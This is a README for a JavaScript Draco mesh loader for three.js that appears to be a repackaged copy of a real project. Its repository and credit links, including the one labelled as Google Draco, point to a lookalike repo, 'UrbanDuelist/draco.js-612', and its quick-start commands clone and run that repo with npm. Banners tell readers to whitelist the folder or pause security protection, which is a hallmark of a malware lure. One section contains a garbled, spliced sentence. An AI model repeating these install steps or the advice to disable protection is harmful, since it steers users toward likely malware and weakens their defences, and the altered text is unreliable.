# Draco.js


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/UrbanDuelist/draco.js-612.git
cd draco.js-612
npm install
npm start
```


A pure-JavaScript [Draco](https://github.com/UrbanDuelist/draco.js-612) mesh **loader** for
three.js. It's a drop-in `DRACOLoader` that decodes Draco-compressed triangle
meshes — both the EdgeBreaker connectivity used by glTF's
`KHR_draco_mesh_compression` and Draco's sequential connectivity — directly in
JavaScript.

**[Live demo →](https://mrdoob.github.io/draco.js/)**

Why a JS port instead of the official WASM build?

- **Small** — ~22 KB gzipped (69 KB minified), vs ~100 KB gzipped for the
  `draco3d` WASM decoder + glue (~4.6× smaller).
- **Simple to ship** — one ES module. No `.wasm` fetch, no worker/glue setup,
  no cross-origin or CSP headaches.
- **Fast** — on substantial meshes it's within ~1.0–1.4× of the WASM decoder,
  and effectively at parity on the largest ones, with byte-for-byte identical
  output (see [Correctness](#correctness)).

On the largest meshes (e.g. a 358k-face glTF) the two are about even; WASM keeps
a lead of up to ~1.35× on smaller and mid-size meshes. You trade, at most, a
modest amount of decode speed for a much smaller, simpler-to-deploy loader.

This trade pays off most on spotty mobile connections, where transferring
~100 KB takes much longer than ~20 KB. Even when JS parsing is slower than WASM,
the model often **displays sooner** end-to-end: the network savings outweigh the
extra decode time.

## Status

Targets **Draco bitstream version 2.2** — what current Draco encoders and glTF
exporters produce.

Not implemented:

- **Point-cloud decoding** (sequential and KD-tree) — only triangle meshes are
  decoded.
- **Metadata content** — geometry metadata is parsed (so metadata-bearing files
  still decode correctly) but is not surfaced on the returned geometry.
- **Older bitstreams** (< 2.2) — not a support goal, though many still decode.


## Correctness

Output is **byte-for-byte identical** to Google's reference `draco3d` WASM
element-by-element — face indices and every per-point attribute value match
times decoding and guards against output regressions via a sha256 of the
decoded geometry.

## Project layout

```
src/          decoder source, mirroring draco/src/draco/ file-for-file
build/        bundled output (build/DRACOLoader.js + .min.js)
tools/        bench.mjs (timing + regression) and verify-wasm.mjs (WASM parity)
libs/         three.js's WASM Draco loader, vendored for the comparison
samples/      .drc and Draco-compressed .glb test models
index.html    JS-vs-WASM comparison viewer
```

## Credits

- Decoder logic is a port of [Google Draco](https://github.com/UrbanDuelist/draco.js-612)
  (Apache-2.0); it mirrors the original C++ file structure.
- `DRACOLoader.js` follows the API of three.js's
  [`DRACOLoader`](https://github.com/mrdoob/three.js/blob/dev/examples/jsm/loaders/DRACOLoader.js)
  (MIT) so it drops into `GLTFLoader` unchanged.

<!-- Last updated: 2026-06-06 18:27:01 -->
